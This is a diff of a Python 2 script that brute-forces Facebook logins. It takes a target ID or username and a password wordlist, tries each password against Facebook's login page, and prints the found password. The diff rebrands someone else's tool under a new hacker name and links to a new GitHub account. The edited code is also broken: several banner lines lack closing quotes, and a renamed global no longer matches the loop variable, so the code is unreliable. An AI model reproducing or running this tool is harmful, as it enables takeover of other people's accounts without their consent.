@@ -36,35 +36,36 @@ def runntxt(s):
 def banner():
     os.system('clear')
     print " "
-    runntxt(GL+"              Assalamu'@laikum. ^_^")
-    runntxt(WW+"     ___      _           _         _      __")
-    runntxt(WW+"    |_ _|__ _| |__   __ _| |____   | |__  / _|")
-    runntxt(GL+"     | |/ _` | '_ \ / _` | |_  /   | '_ \| |_")
-    runntxt(GG+"     | | (_| | |_) | (_| | |/ /_   | |_) |  _|")
-    runntxt(Y+"    |___\__, |_.__/ \__,_|_/___/___|_.__/|_|")
-    runntxt(GG+"           |_| ")
+    runntxt(GL+"            (welcome to ragefreak)
+    runntxt(WW+"       ---rakefreak Facebook hacking---
+	
+    runntxt(WW+"    
+    runntxt(GL+"     
+    runntxt(GG+"      
+    runntxt(Y+"     
+    runntxt(GG+"    
     time.sleep(1.5)
     print GG+"  √=============================================√"
-    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
+    print GL+"  |••••••   ragefreak fb brute tool..   ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: IQBALZ NOOBS             |"
-    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
-    print WW+"  |            FACEBOOK: Iqbalznoobs            |"
-    print Y+"  |             INSTAGRAM: IQBALZ5              |"
+    print WW+"  |            hacker: Ragefreak            |"
+    print GL+"  |       ragefreak is created this tool..       |"
+    print WW+"  |              (((anonymous)))          |"
+    print Y+"  |              ((hackers tools))         |"
     print GL+"  |---------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
+    print GL+"  |                 Ragefreak        |"
     print GL+"  |---------------------------------------------|"
     print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
+    print GL+"  |•••••••••   HACK FACEBOOK NOW   •••••••••|"
     print GG+"  √=============================================√"
 
 banner()
 
-print wd+"         https://www.github.com/IqbalzNoobs "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
+print wd+"         https://www.github.com/ronakalam "
+print GG+"╭────\033[91m[\033[96m  TARGET ID\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
 print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
+print "\033[92m╭────\033[91m[ \033[96mPASSWORD File Wordlist \033[95m( pass.txt ) \033[91;1m]"
 password_list = str(raw_input(GG+"╰────➲\033[93m "))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
@@ -131,7 +132,7 @@ def iqbalz(iqbalz_password):
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
         	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
         	        print " "
-        	        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
+        	        raw_input(WW+"hacking successfully this id.....")
 			sys.exit(1)
   
   
@@ -140,7 +141,7 @@ def iqbalz(iqbalz_password):
       edit_wordlist()
       sys.exit()    	    
 def life():
-	global iqbalz_password
+	global ronakalam_password
 	password_nob = open(password_list, "r")
 	for iqbalz_password in password_nob:
 		password_nob = iqbalz_password.replace("\n","")
@@ -173,8 +174,8 @@ def runn_noobs():
               `-/+///..````..://+/-`
                   `.-::////::-.` \033[91;1m
 
-                \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m Iqbalz Noobs
+                \033[90;1mRagefreak fb hacking tool..\033[91;1m
+             Powered by:\033[97m ragefreak ☠️☠️
       """
 
 
